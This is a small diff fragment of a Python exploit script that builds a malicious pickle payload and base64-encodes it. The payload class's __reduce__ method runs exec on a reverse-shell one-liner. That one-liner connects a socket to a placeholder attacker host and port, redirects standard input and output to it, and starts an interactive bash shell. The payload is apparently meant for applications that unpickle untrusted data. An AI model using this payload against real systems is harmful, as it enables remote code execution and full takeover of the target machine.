@@ -71,6 +71,7 @@ port="PORT"
 class RCE:
     def __reduce__(self):
         return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))
+
 pickled_bytes=pickle.dumps(RCE())    #Object instance ---> Pickle format (bytes)
 pickled_base64_bytes = base64.b64encode(pickled_bytes)    #Pickle format (bytes) ---> Base64 encoding (bytes)
 pickled_base64_string = pickled_base64_bytes.decode('ascii')   #Base64 encoding (bytes) ---> Base64 encoding (string)
